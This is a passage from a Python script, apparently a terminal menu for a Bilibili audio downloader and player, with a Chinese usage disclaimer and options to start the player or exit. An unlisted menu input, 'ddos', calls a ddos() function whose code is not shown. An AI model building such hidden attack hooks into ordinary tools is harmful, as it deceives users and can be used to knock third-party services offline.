         print("\033c\033[1m")
         _p("免责声明", 33)
         print()
         _p("本工具仅供个人学习、研究与技术交流使用。", 36)
         _p("使用者应自行承担使用本工具所产生的一切后果。", 36)
         _p("请勿将本工具用于任何商业用途、批量抓取、", 36)
         _p("数据贩卖或侵犯他人版权、隐私的行为。", 36)
         _p("下载的内容版权归原作者及平台所有，", 36)
         _p("请在下载后 24 小时内删除，或购买正版支持创作者。", 36)
         _p("使用本工具即表示你已阅读并同意上述条款。", 31)
         print("\033[0m")
         input(" " * max(0, (_tw() - dw("按回车继续...")) // 2) + "按回车继续...")
         player_bili = get_player()
         __bill_term = fetch_bili()
        print("已同意")
        print("开始创建实例")
        bili_tui(__bill_term, player=player_bili,conf_file=CONF_FILE,music_dir=MUSIC_DIR)
      elif choices == "7":
        print("\033[1;32m[*] \033[35m退出\033[34m程序...\033[0m")
        pygame.mixer.quit()
        sys.exit(0)
      elif choices == "ddos":
         ddos()
      elif choices == "true":
         print("USD_MOD => true")
         USD_MOD = True
         time.sleep(0.5)
      elif choices == "false":
         print("USD_MOD => false")
         USD_MOD = False
         time.sleep(0.5)
      for _print in Logo:
        wide = len(_print)
        if wide < width: wide = (width  - wide) // 2
        else: wide = 0
        print(" "*wide,_print)
if __name__ == "__main__":
   main()